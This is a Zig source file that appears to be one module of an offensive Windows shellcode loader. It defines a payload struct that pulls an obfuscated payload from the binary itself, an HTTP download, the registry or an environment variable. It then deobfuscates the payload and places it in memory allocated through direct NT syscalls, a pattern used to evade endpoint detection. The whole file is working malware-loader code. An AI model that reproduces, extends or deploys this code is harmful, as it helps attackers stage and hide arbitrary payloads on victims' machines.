const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Apis = @import("api.zig").Apis;
const Syscalls = @import("syscall.zig").Syscalls;
const mem = @import("helper/mem.zig");
const obfs = @import("helper/obfs.zig");
const deobfsBytes = obfs.deobfsBytes;
const deobfsBytesRt = obfs.deobfsBytesRt;
const downloadPayloadViaHttp = @import("http.zig").downloadPayloadViaHttp;
const loadPayloadViaRegistry = @import("registry.zig").loadPayloadViaRegistry;
const loadPayloadViaEnvironment = @import("env.zig").loadPayloadViaEnvironment;

pub const Payload = struct {
    buffer: []u8,
    size: usize,

    const Self = @This();

    pub fn init(apis: Apis, syscalls: Syscalls) !Self {
        if (config.payload_type == config.PayloadType.Embedded) {
            // Deobfuscate the embedded payload
            const payload = deobfsBytes(config.payload_obfs.len, config.payload_obfs, config.obfs_key);
            const payload_alloc = try mem.ntAlloc(
                syscalls,
                null,
                config.payload_obfs.len,
                windows.MEM_COMMIT | windows.MEM_RESERVE,
                windows.PAGE_READWRITE,
            );
            @memcpy(payload_alloc[0..config.payload_obfs.len], payload[0..config.payload_obfs.len]);
            return Self{
                .buffer = payload_alloc,
                .size = config.payload_obfs.len,
            };
        } else if (config.payload_type == config.PayloadType.Http) {
            const http_result = try downloadPayloadViaHttp(apis, syscalls);
            const payload_obfs_len = http_result.size;
            const payload_obfs = http_result.data[0..payload_obfs_len];
            // Deobfuscate the downloaded payload
            const payload_alloc = try mem.ntAlloc(
                syscalls,
                null,
                payload_obfs_len,
                windows.MEM_COMMIT | windows.MEM_RESERVE,
                windows.PAGE_READWRITE,
            );
            try deobfsBytesRt(payload_obfs, payload_alloc[0..payload_obfs_len], config.obfs_key);
            return Self{
                .buffer = payload_alloc,
                .size = payload_obfs_len,
            };
        } else if (config.payload_type == config.PayloadType.Registry) {
            const registry_result = try loadPayloadViaRegistry(apis, syscalls);
            const payload_obfs_len = registry_result.size;
            const payload_obfs = registry_result.data[0..payload_obfs_len];
            // Deobfuscate the retrieved payload
            const payload_alloc = try mem.ntAlloc(
                syscalls,
                null,
                payload_obfs_len,
                windows.MEM_COMMIT | windows.MEM_RESERVE,
                windows.PAGE_READWRITE,
            );
            try deobfsBytesRt(payload_obfs, payload_alloc[0..payload_obfs_len], config.obfs_key);
            return Self{
                .buffer = payload_alloc,
                .size = payload_obfs_len,
            };
        } else if (config.payload_type == config.PayloadType.Env) {
            const env_result = try loadPayloadViaEnvironment(apis, syscalls);
            const payload_obfs_len = env_result.size;
            const payload_obfs = env_result.data[0..payload_obfs_len];
            // Deobfuscate the retrieved payload
            const payload_alloc = try mem.ntAlloc(
                syscalls,
                null,
                payload_obfs_len,
                windows.MEM_COMMIT | windows.MEM_RESERVE,
                windows.PAGE_READWRITE,
            );
            try deobfsBytesRt(payload_obfs, payload_alloc[0..payload_obfs_len], config.obfs_key);
            return Self{
                .buffer = payload_alloc,
                .size = payload_obfs_len,
            };
        }
        return error.InvalidPayloadType;
    }

    pub fn deinit(self: *Self, syscalls: Syscalls) void {
        mem.ntFree(syscalls, self.buffer);
    }
};
